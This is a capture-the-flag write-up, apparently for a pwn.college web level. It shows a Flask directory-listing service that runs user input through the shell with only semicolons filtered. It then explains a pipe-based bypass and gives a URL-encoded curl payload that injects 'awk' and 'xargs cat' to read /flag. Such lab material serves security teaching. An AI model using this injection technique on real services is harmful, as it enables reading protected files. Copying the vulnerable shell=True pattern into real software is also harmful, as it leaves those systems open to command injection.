This is pretty similar to the 1st level, but it blocks any `;` character.

```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET"])
def challenge():
    directory = flask.request.args.get("directory", "/challenge").replace(";", "")
    command = f"ls -l {directory}"
    print(f"DEBUG: {command=}")

    listing = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form><input type=text name=directory><input type=submit value=Submit></form>
        <hr>
        <b>Output of: ls -l {directory}</b><br>
        <pre>{listing}</pre>
        </body></html>
        """

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

What we can do for this level is try to get the name of the flag from the `ls` command and pipe it into the `cat` command.

`cat` can't convert pipe directed input stream into arguments (like `echo` or `cp`), so `xarg` is used to pass input stream as an argument to the command.

The server is using `ls -l` which means we can't directly pipe the output into our cat command. We'll need to extract the file path from the `ls -l` command. The command output 9 space-delimited strings, so we can access each one of them through field variables `$1`, `$2`, etc. We can use the `awk` command to split the output into field variables and print it out to `stdout`. For this case, the file path is on `$9`.

```bash
ls -l /flag | awk '{print $9}' | xargs cat
```

So our final payload is this:

```bash
curl -v "http://challenge.localhost:80/?directory=%2Fflag%7Cawk%20%27%7Bprint%20%249%7D%27%7Cxargs%20cat"
```